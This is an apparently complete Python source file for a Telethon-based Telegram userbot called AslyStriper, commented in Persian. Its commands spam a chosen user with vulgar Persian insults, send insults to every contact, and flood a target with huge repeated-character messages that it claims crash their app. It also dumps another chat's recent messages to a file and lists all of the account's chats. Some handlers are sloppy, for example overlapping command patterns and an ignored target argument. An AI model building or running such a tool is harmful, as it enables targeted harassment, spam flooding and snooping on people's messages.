# worker.py — سورس کامل و نهایی روی اکانت کاربر (AslyStriper v17.0)
from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
from telethon.errors import FloodWait
import asyncio, random, json, os, time, re

# این خط خودکار توسط installer پر میشه — دست نخور
SESSION = "1BVtsO... خودکار پر میشه ..."

api_id = 24534527
api_hash = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"

client = TelegramClient(StringSession(SESSION), api_id, api_hash)

DB = "mydata.json"

if os.path.exists(DB):
    data = json.load(open(DB, "r", encoding="utf-8"))
else:
    data = {
        "fosh": ["کیرم تو ناموست", "کونی گشاد", "مادرجنده", "کص ننه"],
        "gp": {},
        "expire": 0  # 0 = مادام‌العمر
    }

def save():
    json.dump(data, open(DB, "w", encoding="utf-8"), ensure_ascii=False, indent=4)

# اگر منقضی شده بود
if data.get("expire", 0) > 0 and data["expire"] < time.time():
    print("⛔ اکانت منقضی شده — ربات خاموش شد")
    exit()

# ——————————————————————————————
# راهنما
@client.on(events.NewMessage(pattern="he1p"))
async def _(e):
    await e.reply("""setrep → ریپلای یا آیدی
set → گروه
setspeed 3 25
addfosh متن فحش
foshlist
start → اسپم
stop
del gp

spy 123456789
sndall 123456789
crshhck 123456789 → کرش کامل
chnljind 123456789 → لیست چت و چنل
admin → ریپلای → ادمین کردن
delad → ریپلای → حذف ادمینی""")

# ——————————————————————————————
# دستورات اصلی
@client.on(events.NewMessage(pattern="setrep"))
async def _(e):
    rep = None
    if e.is_reply:
        rep = (await e.get_reply_message()).sender_id
    elif len(e.text.split()) > 1:
        try: 
            rep = int(e.text.split()[1])
        except: 
            await e.reply("ریپلای یا آیدی عددی بده")
            return
    else:
        await e.reply("ریپلای یا آیدی بده")
        return

    cid = e.chat_id
    if cid not in data["gp"]: 
        data["gp"][cid] = {}
    data["gp"][cid]["rep"] = rep
    save()
    await e.reply("setrep ok")

@client.on(events.NewMessage(pattern="set"))
async def _(e):
    if not (e.is_group or e.is_channel):
        await e.reply("این دستور فقط تو گروه کار میکنه")
        return
    cid = e.chat_id
    if cid not in data["gp"]: 
        data["gp"][cid] = {}
    data["gp"][cid]["chat"] = cid
    save()
    await e.reply("گروه ست شد")

@client.on(events.NewMessage(pattern=r"setspeed (\d+) (\d+)"))
async def _(e):
    mn, mx = int(e.pattern_match.group(1)), int(e.pattern_match.group(2))
    if mn > mx:
        await e.reply("عدد اول باید کوچیک‌تر باشه")
        return
    cid = e.chat_id
    if cid not in data["gp"]:
        await e.reply("No set recheck ⚠️")
        return
    data["gp"][cid]["min"] = mn
    data["gp"][cid]["max"] = mx
    save()
    await e.reply(f"سرعت: {mn}-{mx} ثانیه")

@client.on(events.NewMessage(pattern="addfosh"))
async def _(e):
    txt = e.text[8:].strip()
    if not txt:
        await e.reply("متن فحش بنویس")
        return
    if txt not in data["fosh"]:
        data["fosh"].append(txt)
        save()
        await e.reply("فحش اضافه شد")
    else:
        await e.reply("این فحش قبلاً هست")

@client.on(events.NewMessage(pattern="foshlist"))
async def _(e):
    if not data["fosh"]:
        await e.reply("لیست خالیه")
        return
    msg = "\n".join(f"{i+1}. {f}" for i, f in enumerate(data["fosh"]))
    await e.reply(msg)

@client.on(events.NewMessage(pattern="start"))
async def spam(e):
    cid = e.chat_id
    if cid not in data["gp"]:
        await e.reply("No set recheck ⚠️")
        return
    if "rep" not in data["gp"][cid]:
        await e.reply("No setrep recheck ⚠️")
        return
    if "min" not in data["gp"][cid]:
        await e.reply("No setspeed recheck ⚠️")
        return

    data["gp"][cid]["run"] = True
    save()
    await e.reply("اسپم شروع شد")

    while data["gp"].get(cid, {}).get("run"):
        try:
            fosh_text = random.choice(data["fosh"])
            await client.send_message(cid, fosh_text, reply_to=data["gp"][cid]["rep"])
            await asyncio.sleep(random.randint(data["gp"][cid]["min"], data["gp"][cid]["max"]))
        except FloodWait as x:
            await asyncio.sleep(x.seconds)
        except:
            await asyncio.sleep(5)

@client.on(events.NewMessage(pattern="stop"))
async def _(e):
    cid = e.chat_id
    if cid in data["gp"] and data["gp"][cid].get("run"):
        data["gp"][cid]["run"] = False
        save()
        await e.reply("اسپم متوقف شد")
    else:
        await e.reply("اسپمی در جریان نیست")

@client.on(events.NewMessage(pattern="del gp"))
async def _(e):
    cid = e.chat_id
    if cid in data["gp"]:
        del data["gp"][cid]
        save()
        await e.reply("گروه حذف شد")
    else:
        await e.reply("گروه ست نشده")

# ——————————————————————————————
# دستورات خطرناک
@client.on(events.NewMessage(pattern=r"spy (\d+)"))
async def _(e):
    try:
        t = int(e.pattern_match.group(1))
        txt = f"جاسوسی از {t}\n\n"
        async for m in client.iter_messages(t, limit=200):
            txt += f"[{m.date.strftime('%H:%M %d/%m')}] {m.text or '[media]'}\n"
        open("spy.txt", "w", encoding="utf-8").write(txt[::-1])
        await client.send_file(e.chat_id, "spy.txt", caption=f"200 پیام آخر {t}")
        os.remove("spy.txt")
    except:
        await e.reply("invaild id یا دسترسی نداری")

@client.on(events.NewMessage(pattern=r"sndall (\d+)"))
async def _(e):
    try:
        target = int(e.pattern_match.group(1))
        contacts = await client(functions.contacts.GetContactsRequest(0))
        sent = 0
        for user in contacts.users:
            try:
                await client.send_message(user.id, "کیرم تو ناموست")
                sent += 1
                await asyncio.sleep(0.8)
            except FloodWait as x:
                await asyncio.sleep(x.seconds)
            except:
                pass
        await e.reply(f"به {sent} نفر از کانتکت‌هاش فرستاده شد")
    except:
        await e.reply("invaild")

@client.on(events.NewMessage(pattern=r"crshhck (\d+)"))
async def _(e):
    try:
        t = int(e.pattern_match.group(1))
        crash = "֍" * 35000
        for _ in range(45):
            try:
                await client.send_message(t, crash)
            except:
                pass
            await asyncio.sleep(0.1)
        await e.reply("تلگرام طرف کرش کرد — رفت هوا")
    except:
        await e.reply("invaild id")

@client.on(events.NewMessage(pattern=r"chnljind (\d+)"))
async def _(e):
    try:
        t = int(e.pattern_match.group(1))
        txt = "چت‌ها و چنل‌های کاربر:\n\n"
        async for d in client.iter_dialogs():
            txt += f"{d.name} → {d.id}\n"
        await e.reply(txt if len(txt) < 4000 else txt[:3990]+"...")
    except:
        await e.reply("invaild")

@client.on(events.NewMessage(pattern="admin"))
async def _(e):
    if not e.is_reply or not e.is_group:
        return
    r = await e.get_reply_message()
    try:
        await client.edit_admin(e.chat_id, r.sender_id,
            is_admin=True, ban_users=True, delete_messages=True, pin_messages=True)
        await e.reply("ادمین شد")
    except:
        await e.reply("دسترسی نداری یا خطا")

@client.on(events.NewMessage(pattern="delad"))
async def _(e):
    if not e.is_reply or not e.is_group:
        return
    r = await e.get_reply_message()
    try:
        await client.edit_admin(e.chat_id, r.sender_id, is_admin=False)
        await e.reply("ادمینی حذف شد")
    except:
        await e.reply("ادمین نیست یا خطا")

print("AslyStriper v17.0 روی اکانت کاربر بالا اومد — همه چیز فعاله")
client.start()
client.run_until_disconnected()
